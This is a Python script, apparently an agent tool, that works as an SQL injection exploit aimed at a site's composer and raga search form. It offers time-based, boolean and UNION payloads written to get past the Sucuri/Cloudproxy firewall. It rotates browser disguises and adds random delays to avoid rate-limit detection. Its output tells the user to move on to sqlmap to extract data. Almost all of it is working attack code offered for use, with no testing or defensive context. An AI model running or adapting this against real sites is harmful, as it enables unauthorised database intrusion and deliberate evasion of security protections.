from src.sdk.tool import function_tool
import os
import subprocess

#!/usr/bin/env python3
"""
Advanced SQL injection extractor with WAF bypass for Sucuri/Cloudproxy.
Uses sophisticated evasion techniques to extract database information.
"""
import requests
import time
import random
import urllib.parse
from typing import Optional, Tuple

def random_delay(min_sec=1, max_sec=3):
    """Random delay to avoid rate limiting detection"""
    time.sleep(random.uniform(min_sec, max_sec))

def get_payloads():
    """Return a list of WAF-evasive payloads"""
    base_payloads = [
        # Boolean-based with WAF evasion
        "test' AND SLEEP(5)-- -",
        "test' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
        "test'/**/AND/**/1=1-- -",
        "test'/*!*/AND/*!*/1=1-- -",
        "test' AND 1=1 LIMIT 1-- -",
        "test' OR 1=1 LIMIT 1-- -",
        # Union-based with column discovery
        "test' UNION SELECT NULL-- -",
        "test' UNION SELECT NULL,NULL-- -",
        "test' UNION SELECT NULL,NULL,NULL-- -",
        "test' UNION SELECT NULL,NULL,NULL,NULL-- -",
        "test' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
        # Charset encoding bypass
        "test'%20AND%201=1--%20-",
        "test'+AND+1=1--+-",
    ]
    return base_payloads

def get_headers():
    """Return headers that mimic real browser traffic"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ]
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    return headers

def extract_dbs(target_url: str, cookies: Optional[str] = None) -> Tuple[bool, str]:
    """
    Attempt to extract database information using SQL injection.
    Returns (success, evidence/error)
    """
    session = requests.Session()
    session.headers.update(get_headers())
    
    if cookies:
        for cookie in cookies.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                session.cookies.set(name, value)
    
    # First, get baseline response time
    baseline_data = {
        'composer_name': 'test',
        'composition_keywords': 'test',
        'raga_name': 'test',
        'composer_deity': 'test',
        'keerthana_id': 'test'
    }
    
    try:
        start = time.time()
        resp = session.post(target_url, data=baseline_data, verify=False, timeout=15)
        baseline_time = time.time() - start
        print(f"[*] Baseline response time: {baseline_time:.2f}s")
    except Exception as e:
        return False, f"Baseline request failed: {str(e)}"
    
    # Test for vulnerability with time-based payload
    time_payloads = [
        "test' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
        "test' AND SLEEP(5)-- -",
    ]
    
    for payload in time_payloads:
        random_delay(2, 5)
        test_data = baseline_data.copy()
        test_data['composer_name'] = payload
        
        try:
            start = time.time()
            resp = session.post(target_url, data=test_data, verify=False, timeout=15)
            elapsed = time.time() - start
            
            if elapsed >= 4:  # At least 4 seconds indicates possible SQLi
                return True, f"Time-based SQLi confirmed! Payload: {payload} - Response time: {elapsed:.2f}s"
        except requests.exceptions.Timeout:
            # Timeout might indicate successful time-based injection
            return True, f"Request timed out with payload (likely SQLi): {payload}"
        except Exception as e:
            print(f"[!] Error with payload {payload}: {str(e)}")
            continue
    
    # Test for error-based injection
    error_payloads = [
        "test' UNION SELECT NULL-- -",
        "test' UNION SELECT NULL,NULL-- -",
    ]
    
    for payload in error_payloads:
        random_delay(2, 5)
        test_data = baseline_data.copy()
        test_data['composer_name'] = payload
        
        try:
            resp = session.post(target_url, data=test_data, verify=False, timeout=15)
            
            # Look for SQL error patterns in response
            sql_errors = [
                'SQL syntax', 'mysql', 'syntax error', 'unclosed quotation',
                'ODBC', 'JDBC', 'Driver', 'SQLSTATE', 'mssql', 'PostgreSQL',
                'ORA-', 'Oracle', 'Warning: mysql_', 'Fatal error', 'call to undefined function',
                'You have an error in your SQL syntax'
            ]
            
            if any(err.lower() in resp.text.lower() for err in sql_errors):
                return True, f"Error-based SQLi detected! Payload: {payload}\nResponse snippet: {resp.text[:500]}"
        except Exception as e:
            print(f"[!] Error with payload {payload}: {str(e)}")
            continue
    
    return False, "No SQL injection evidence found with tested payloads"

if __name__ == "__main__":
    import sys
    import warnings
    warnings.filterwarnings('ignore')
    
    if len(sys.argv) < 2:
        print("Usage: python3 advanced_sqli_extractor.py <target_url> [cookies]")
        sys.exit(1)
    
    target = sys.argv[1]
    cookies = sys.argv[2] if len(sys.argv) > 2 else None
    
    print(f"[*] Starting advanced SQL injection extraction on {target}")
    print(f"[*] WAF bypass mode enabled for Sucuri/Cloudproxy")
    
    success, evidence = extract_dbs(target, cookies)
    
    if success:
        print("\n" + "="*60)
        print("CONFIRMED: SQL Injection Vulnerability")
        print("="*60)
        print(evidence)
        print("\n[*] Next steps: Use sqlmap with custom tamper scripts to extract data")
    else:
        print("\n" + "="*60)
        print("RESULT: Could not confirm exploitation")
        print("="*60)
        print(evidence)